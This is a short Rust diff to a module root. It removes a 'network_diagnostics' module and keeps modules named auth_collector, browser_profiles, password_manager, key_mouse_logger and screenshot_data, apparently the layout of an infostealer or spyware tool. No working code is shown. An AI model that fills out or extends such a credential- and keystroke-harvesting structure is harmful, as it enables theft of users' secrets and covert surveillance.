@@ -7,7 +7,6 @@ pub mod password_manager;
 pub mod system_info;
 pub mod key_mouse_logger;
 pub mod screenshot_data;
-pub mod network_diagnostics; // safe, non-secret diagnostics
 
 pub use auth_collector::*;
 pub use browser_profiles::*;
@@ -17,4 +16,3 @@ pub use password_manager::*;
 pub use system_info::*;
 pub use key_mouse_logger::*;
 pub use screenshot_data::*;
-pub use network_diagnostics::*;
